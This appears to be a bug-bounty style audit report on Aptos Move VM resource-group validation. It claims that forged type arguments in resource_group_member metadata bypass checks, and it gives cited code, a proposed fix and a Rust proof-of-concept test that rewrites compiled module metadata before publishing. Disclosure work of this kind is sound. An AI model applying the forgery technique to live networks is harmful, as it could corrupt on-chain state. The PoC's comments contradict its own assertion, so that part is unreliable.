# Audit Report

## Title
Resource Group Validation Allows Forged StructTag Type Arguments Leading to Type System Violation and State Fragmentation

## Summary
The resource group validation in the Aptos VM verifier only validates the struct name when checking resource_group_member metadata, but does not verify that the StructTag's type arguments match the actual struct definition. This allows attackers to forge metadata with invalid type arguments, bypassing Move's type system and causing resource group fragmentation.

## Finding Description

When a module declares a struct as a `resource_group_member`, the container is specified as a StructTag in the module's metadata. During module publishing, the validation process extracts this StructTag and validates it in `validate_resource_groups()`. [1](#0-0) 

The critical flaw occurs at the validation step where only the struct **name** is checked: [2](#0-1) 

The validation uses `group_tag.name.as_ident_str().as_str()` to look up the group, completely ignoring the `type_args` field in the StructTag.

The StructTag structure includes a `type_args` field that is never validated against the actual struct definition: [3](#0-2) 

An attacker can exploit this by:

1. Compiling a module normally with a valid `#[resource_group_member]` attribute
2. Modifying the compiled bytecode to change the metadata string (e.g., from `0x1::object::ObjectGroup` to `0x1::object::ObjectGroup<u8>`)
3. Publishing the modified module

The metadata parsing simply converts the string to a StructTag without validation: [4](#0-3) 

Metadata modification is demonstrably possible, as shown in the codebase's own tests: [5](#0-4) 

At runtime, when accessing resources, the system uses the forged StructTag to create storage keys: [6](#0-5) 

This creates a StateKey for `ObjectGroup<u8>` which is distinct from the legitimate `ObjectGroup`, causing resources to be stored at incorrect locations and violating Move's type system, since ObjectGroup is defined without type parameters: [7](#0-6) 

The compile-time validation enforces that resource groups cannot have type parameters: [8](#0-7) [9](#0-8) 

However, the runtime validation during module publishing does not verify that the StructTag's type_args match this requirement.

## Impact Explanation

This is a **Medium Severity** vulnerability based on Aptos bug bounty criteria:

1. **State Inconsistencies**: Creates multiple resource group instances per address (e.g., `ObjectGroup`, `ObjectGroup<u8>`, `ObjectGroup<bool>`), fragmenting state across different storage locations.

2. **Type System Violation**: Allows instantiation of structs with incorrect type arguments, breaking Move's core type safety guarantees. A struct defined without type parameters can be instantiated with arbitrary type arguments through metadata forgery.

3. **Storage Fragmentation**: Resources that should be grouped together are split across multiple storage locations, affecting storage organization and potentially gas accounting models.

While this does not directly cause fund loss or consensus breaks, it creates state inconsistencies requiring manual intervention and violates fundamental type system invariants that are critical to Move's security model. This aligns with the Medium severity category: "State inconsistencies requiring manual intervention."

## Likelihood Explanation

**Likelihood: Medium**

The attack is feasible for moderately skilled attackers who can:
- Compile Move code using the standard compiler
- Parse and modify BCS-serialized metadata in compiled bytecode
- Reserialize and publish the modified module through standard APIs

Key factors:
- **No special permissions required**: Any user can publish modules
- **Moderate technical difficulty**: Requires bytecode manipulation but no deep system access
- **Deterministic**: Once bytecode is correctly modified, the attack succeeds reliably
- **Affects global resources**: Global-scope groups like ObjectGroup are particularly vulnerable
- **Validation bypass**: The current validation only checks struct names, not type arguments

## Recommendation

Add validation in `validate_resource_groups()` to verify that the StructTag's `type_args` field matches the actual struct definition's type parameters:

1. After looking up the resource group by name, retrieve the actual struct handle
2. Verify that `group_tag.type_args.len()` equals the struct's `type_parameters.len()`
3. For resource groups specifically, enforce that `group_tag.type_args.is_empty()` since resource groups must have no type parameters

The fix should be added around line 92 in `resource_groups.rs`:

```rust
let scope = if let Some(inner_group) = groups.get(&group_module_id) {
    inner_group
        .get(group_tag.name.as_ident_str().as_str())
        .ok_or_else(|| metadata_validation_error("Invalid resource_group attribute"))?
} else {
    return Err(metadata_validation_error("No such resource_group"));
};

// Add validation for type_args
if !group_tag.type_args.is_empty() {
    return Err(metadata_validation_error(
        "Resource group cannot have type arguments"
    ));
}
```

## Proof of Concept

```rust
// In aptos-move/e2e-move-tests/src/tests/resource_groups.rs
#[test]
fn test_forged_type_args_in_resource_group() {
    let mut h = MoveHarness::new();
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xf00d").unwrap());
    
    // Compile a valid module
    let mut builder = PackageBuilder::new("Package");
    builder.add_source(
        "m.move",
        r#"
        module 0xf00d::M {
            use aptos_framework::object::ObjectGroup;
            
            #[resource_group_member(group = aptos_framework::object::ObjectGroup)]
            struct MyResource has key {
                value: u64
            }
        }
        "#,
    );
    let path = builder.write_to_temp().unwrap();
    let package = BuiltPackage::build(path.path().to_path_buf(), BuildOptions::default())
        .expect("building package must succeed");
    
    // Extract and modify metadata
    let origin_code = package.extract_code();
    let mut compiled_module = CompiledModule::deserialize(&origin_code[0]).unwrap();
    
    // Forge metadata to add type arguments
    let mut metadata = get_metadata_from_compiled_code(&compiled_module).unwrap();
    if let Some(attrs) = metadata.struct_attributes.get_mut("MyResource") {
        for attr in attrs.iter_mut() {
            if attr.is_resource_group_member() {
                // Modify to add type argument: ObjectGroup<u8>
                *attr = KnownAttribute::resource_group_member(
                    "0x1::object::ObjectGroup<u8>".to_string()
                );
            }
        }
    }
    
    // Reserialize with forged metadata
    compiled_module.metadata = vec![Metadata {
        key: APTOS_METADATA_KEY_V1.to_vec(),
        value: bcs::to_bytes(&metadata).unwrap(),
    }];
    let mut modified_code = vec![];
    compiled_module.serialize(&mut modified_code).unwrap();
    
    // Publish - this should fail but currently succeeds
    let result = h.run_transaction_payload(
        &account,
        aptos_stdlib::code_publish_package_txn(
            bcs::to_bytes(&package.extract_metadata().unwrap()).unwrap(),
            vec![modified_code],
        ),
    );
    
    // Currently passes when it should fail
    assert_vm_status!(result, StatusCode::CONSTRAINT_NOT_SATISFIED);
}
```

## Notes

This vulnerability demonstrates a gap between compile-time validation (which enforces correct structure) and runtime validation (which only checks names). The type system violation is particularly concerning because it breaks Move's fundamental guarantee that struct instantiations match their definitions. While the immediate impact is limited to the attacker's own module, it represents a violation of core security invariants that could have broader implications if combined with other vulnerabilities.

### Citations

**File:** aptos-move/aptos-vm/src/verifier/resource_groups.rs (L36-104)
```rust
pub(crate) fn validate_resource_groups(
    features: &Features,
    module_storage: &impl ModuleStorage,
    traversal_context: &mut TraversalContext,
    gas_meter: &mut impl GasMeter,
    new_modules: &[CompiledModule],
) -> Result<(), VMError> {
    let mut groups = BTreeMap::new();
    let mut members = BTreeMap::new();

    for new_module in new_modules {
        let (new_groups, new_members) = validate_module_and_extract_new_entries(
            module_storage,
            new_module,
            features,
            traversal_context,
        )?;
        groups.insert(new_module.self_id(), new_groups);
        members.insert(new_module.self_id(), new_members);
    }

    for (module_id, inner_members) in members {
        for group_tag in inner_members.values() {
            let group_module_id = group_tag.module_id();
            if !groups.contains_key(&group_module_id) {
                // Note: module must exist for the group member to refer to it! Also, we need to
                // charge gas because this module is not in a bundle.
                if features.is_lazy_loading_enabled()
                    && traversal_context.visit_if_not_special_module_id(&group_module_id)
                {
                    let size = module_storage.unmetered_get_existing_module_size(
                        group_module_id.address(),
                        group_module_id.name(),
                    )?;
                    gas_meter
                        .charge_dependency(
                            DependencyKind::Existing,
                            group_module_id.address(),
                            group_module_id.name(),
                            NumBytes::new(size as u64),
                        )
                        .map_err(|err| err.finish(Location::Undefined))?;
                }
                let old_module = module_storage.unmetered_get_existing_deserialized_module(
                    group_module_id.address(),
                    group_module_id.name(),
                )?;

                let (inner_groups, _, _) =
                    extract_resource_group_metadata_from_module(&old_module)?;
                groups.insert(group_tag.module_id(), inner_groups);
            }

            let scope = if let Some(inner_group) = groups.get(&group_module_id) {
                inner_group
                    .get(group_tag.name.as_ident_str().as_str())
                    .ok_or_else(|| metadata_validation_error("Invalid resource_group attribute"))?
            } else {
                return Err(metadata_validation_error("No such resource_group"));
            };

            if !scope.are_equal_module_ids(&module_id, &group_module_id) {
                metadata_validation_err("Scope mismatch")?;
            }
        }
    }

    Ok(())
}
```

**File:** third_party/move/move-core/types/src/language_storage.rs (L216-223)
```rust
pub struct StructTag {
    pub address: AccountAddress,
    pub module: Identifier,
    pub name: Identifier,
    // alias for compatibility with old json serialized data.
    #[serde(rename = "type_args", alias = "type_params")]
    pub type_args: Vec<TypeTag>,
}
```

**File:** types/src/vm/module_metadata.rs (L138-143)
```rust
    pub fn get_resource_group_member(&self) -> Option<StructTag> {
        if self.kind == KnownAttributeKind::ResourceGroupMember as u8 {
            self.args.first()?.parse().ok()
        } else {
            None
        }
```

**File:** types/src/vm/module_metadata.rs (L408-413)
```rust
            if struct_handle.abilities == AbilitySet::EMPTY
                && struct_handle.type_parameters.is_empty()
                && num_fields == 1
            {
                return Ok(());
            }
```

**File:** aptos-move/e2e-move-tests/src/tests/metadata.rs (L104-139)
```rust
fn test_metadata_with_changes(f: impl Fn() -> Vec<Metadata>) -> TransactionStatus {
    let mut h = MoveHarness::new();
    let account = h.new_account_at(AccountAddress::from_hex_literal("0xf00d").unwrap());

    let mut builder = PackageBuilder::new("Package");
    builder.add_source(
        "m.move",
        r#"
        module 0xf00d::M {
            #[view]
            fun foo(value: u64): u64 { value }
        }
        "#,
    );
    let path = builder.write_to_temp().unwrap();

    let package = BuiltPackage::build(path.path().to_path_buf(), BuildOptions::default())
        .expect("building package must succeed");
    let origin_code = package.extract_code();
    let mut compiled_module = CompiledModule::deserialize(&origin_code[0]).unwrap();
    let metadata = f();
    let mut invalid_code = vec![];
    compiled_module.metadata = metadata;
    compiled_module.serialize(&mut invalid_code).unwrap();

    let package_metadata = package
        .extract_metadata()
        .expect("extracting package metadata must succeed");
    h.run_transaction_payload(
        &account,
        aptos_stdlib::code_publish_package_txn(
            bcs::to_bytes(&package_metadata).expect("PackageMetadata has BCS"),
            vec![invalid_code],
        ),
    )
}
```

**File:** types/src/state_store/state_key/mod.rs (L160-171)
```rust
    pub fn resource_group(address: &AccountAddress, struct_tag: &StructTag) -> Self {
        Self(
            REGISTRY
                .resource_group(struct_tag, address)
                .get_or_add(struct_tag, address, || {
                    Ok(StateKeyInner::AccessPath(
                        AccessPath::resource_group_access_path(*address, struct_tag.clone()),
                    ))
                })
                .expect("only possible error is resource path serialization"),
        )
    }
```

**File:** aptos-move/framework/aptos-framework/sources/object.move (L121-123)
```text
    #[resource_group(scope = global)]
    /// A shared resource group for storing object resources together in storage.
    struct ObjectGroup {}
```

**File:** aptos-move/framework/src/extended_checks.rs (L449-455)
```rust
        if !struct_.get_type_parameters().is_empty() {
            self.env.error(
                &struct_.get_loc(),
                "resource_group should not have type parameters",
            );
            return None;
        }
```
